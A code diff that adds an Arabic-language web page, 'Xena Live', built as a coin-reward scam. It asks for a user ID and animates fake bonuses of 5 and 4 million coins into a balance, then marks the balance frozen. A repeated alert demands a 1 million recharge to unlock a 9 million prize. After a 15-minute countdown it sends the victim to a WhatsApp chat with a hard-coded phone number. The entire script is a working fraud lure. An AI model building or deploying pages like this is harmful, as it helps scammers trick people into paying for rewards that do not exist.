@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Xena Live</title>
+<style>
+  body{
+    margin:0; font-family:"Tahoma", Arial, sans-serif; color:#fff;
+    background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+    min-height:100vh; display:flex; align-items:center; justify-content:center;
+  }
+  .wrap{width:100%; max-width:520px; padding:20px}
+  .panel{
+    background:rgba(255,255,255,.08);
+    border-radius:20px; padding:24px;
+    box-shadow:0 10px 25px rgba(0,0,0,.4);
+    backdrop-filter: blur(6px);
+    text-align:center;
+    transition: all .4s ease;
+  }
+  h1{margin:0 0 18px; font-size:28px; color:#FFD700}
+  .hidden{display:none}
+
+  input[type="text"]{
+    width:100%; padding:12px; border-radius:12px; border:none; outline:none;
+    font-size:16px; margin-bottom:14px;
+  }
+  .btn-main{
+    display:block; width:100%; padding:14px; margin:10px 0;
+    font-size:18px; font-weight:700; cursor:pointer; color:#111;
+    background:linear-gradient(45deg,#FFD700,#FFA500);
+    border:none; border-radius:14px;
+    box-shadow:0 6px 15px rgba(255,165,0,.4);
+    transition:transform .18s ease;
+  }
+  .btn-main:hover{transform:translateY(-2px)}
+
+  .card-btn{
+    width:100%; max-width:420px; margin:14px auto;
+    background:#F5F7FA; color:#0B1220; text-align:center;
+    border-radius:18px; padding:18px 16px; cursor:pointer;
+    box-shadow:0 6px 16px rgba(0,0,0,.14);
+    transition:transform .18s ease, box-shadow .18s ease;
+  }
+  .card-btn:hover{transform:translateY(-3px); box-shadow:0 10px 22px rgba(0,0,0,.18)}
+  .icon{font-size:30px; margin-bottom:6px}
+  .num{font-size:26px; font-weight:800; letter-spacing:.4px}
+  .sub{display:block; margin-top:4px; color:#6B7280; font-size:14px; font-weight:700}
+
+  .frozen{margin-top:8px; color:#ff3b3b; font-size:15px; font-weight:bold}
+  .success{color:#00FF7F; font-size:22px; margin:18px 0}
+  #timerHint{color:#cbd5e1; margin-top:10px; min-height:20px}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <!-- الصفحة 1 -->
+  <div id="p1" class="panel">
+    <h1>Xena Live</h1>
+    <input id="uid" type="text" placeholder="ادخل الايدي">
+    <button class="btn-main" onclick="enterApp()">دخول</button>
+  </div>
+
+  <!-- الصفحة 2 -->
+  <div id="p2" class="panel hidden">
+    <h2>الايدي: <span id="idShow"></span></h2>
+
+    <div class="card-btn" style="cursor:default">
+      <div class="icon">🪙</div>
+      <div id="balText" class="num">0</div>
+      <span class="sub">رصيدي</span>
+    </div>
+
+    <div class="card-btn" onclick="goRewards()">
+      <div class="icon">🪙</div>
+      <div class="num">5,000,000</div>
+      <span class="sub">🎁 جوائز الحساب</span>
+    </div>
+  </div>
+
+  <!-- الصفحة 3 -->
+  <div id="p3" class="panel hidden">
+    <div class="card-btn" style="cursor:default">
+      <div class="icon">🪙</div>
+      <div id="balText2" class="num">0</div>
+      <span class="sub">رصيدي</span>
+    </div>
+
+    <div class="card-btn" onclick="goCompensation()">
+      <div class="icon">🪙</div>
+      <div class="num">4,000,000</div>
+      <span class="sub">🎮 تعويض الألعاب</span>
+    </div>
+  </div>
+
+  <!-- الصفحة 4 -->
+  <div id="p4" class="panel hidden">
+    <div class="card-btn" style="cursor:default">
+      <div class="icon">🪙</div>
+      <div id="balText3" class="num">0</div>
+      <span class="sub">رصيدي</span>
+      <div class="frozen">🔒 مجمد</div>
+    </div>
+
+    <div class="card-btn" onclick="insurance()">
+      <div class="icon">🪙</div>
+      <div class="num">التأمين</div>
+      <span class="sub">🔑 إضافة الجائزة</span>
+    </div>
+
+    <div id="timerHint"></div>
+  </div>
+
+  <!-- الصفحة 5 -->
+  <div id="p5" class="panel hidden">
+    <div class="success">✔️ تمت العملية بنجاح</div>
+    <div class="card-btn" onclick="openWhatsApp()">
+      <div class="icon">🪙</div>
+      <div class="num">استلام إشعار من واتساب</div>
+      <span class="sub">📲 متابعة عبر WhatsApp</span>
+    </div>
+  </div>
+</div>
+
+<script>
+  let balance = 0;
+  let t0 = null;
+  let timerId = null;
+  let userId = "";
+
+  function enterApp(){
+    const v = document.getElementById('uid').value.trim();
+    if(!v){ alert("الرجاء إدخال الايدي"); return; }
+    userId = v;
+    document.getElementById('idShow').textContent = userId;
+    setNumber('balText', balance);
+    swap('p1','p2');
+  }
+
+  function goRewards(){
+    animateTo(balance, balance + 5000000, ['balText','balText2']);
+    balance += 5000000;
+    swap('p2','p3');
+  }
+
+  function goCompensation(){
+    animateTo(balance, balance + 4000000, ['balText','balText2','balText3']);
+    balance += 4000000;
+    swap('p3','p4');
+    startCountdown();
+  }
+
+  function insurance(){
+    if(!t0){
+      alert("رصيدك غير كافي للتأمين يرجى شحن 1مليون لتحصل على الجائزه 9مليون كوينزه");
+      return;
+    }
+    const mins = (Date.now() - t0) / 60000;
+    if(mins < 15){
+      alert("رصيدك غير كافي للتأمين يرجى شحن 1مليون لتحصل على الجائزه 9مليون كوينزه");
+    }else{
+      clearTimer();
+      swap('p4','p5');
+    }
+  }
+
+  function openWhatsApp(){
+    const msg = `مرحبا، هذا الايدي: ${userId} ورصيدي: ${balance.toLocaleString()} 🪙`;
+    const phone = "201505842240"; // الرقم الجديد
+    window.location.href = `https://wa.me/${phone}?text=${encodeURIComponent(msg)}`;
+  }
+
+  /* ---- Helpers ---- */
+  function setNumber(id, val){
+    const el = document.getElementById(id);
+    if(el) el.textContent = Number(val).toLocaleString('en-US');
+  }
+
+  function animateTo(from, to, targets){
+    const start = performance.now();
+    const duration = 900;
+    function frame(now){
+      const p = Math.min((now - start)/duration, 1);
+      const ease = 1 - Math.pow(1 - p, 3);
+      const curr = Math.floor(from + (to - from) * ease);
+      (targets || []).forEach(id => setNumber(id, curr));
+      if(p < 1) requestAnimationFrame(frame);
+    }
+    requestAnimationFrame(frame);
+  }
+
+  function swap(hideId, showId){
+    document.getElementById(hideId).classList.add('hidden');
+    document.getElementById(showId).classList.remove('hidden');
+  }
+
+  function startCountdown(){
+    clearTimer();
+    t0 = Date.now();
+    const hint = document.getElementById('timerHint');
+    function update(){
+      const left = 15*60*1000 - (Date.now() - t0);
+      if(left <= 0){
+        hint.textContent = "✔️ جاهز: التأمين متاح الآن";
+        clearTimer();
+        return;
+      }
+      const s = Math.ceil(left / 1000);
+      const mm = String(Math.floor(s/60)).padStart(2,'0');
+      const ss = String(s%60).padStart(2,'0');
+      hint.textContent = `⏳ الوقت المتبقي لتفعيل التأمين: ${mm}:${ss}`;
+    }
+    update();
+    timerId = setInterval(update, 1000);
+  }
+
+  function clearTimer(){
+    if(timerId){ clearInterval(timerId); timerId = null; }
+  }
+</script>
+
+</body>
+  </html>
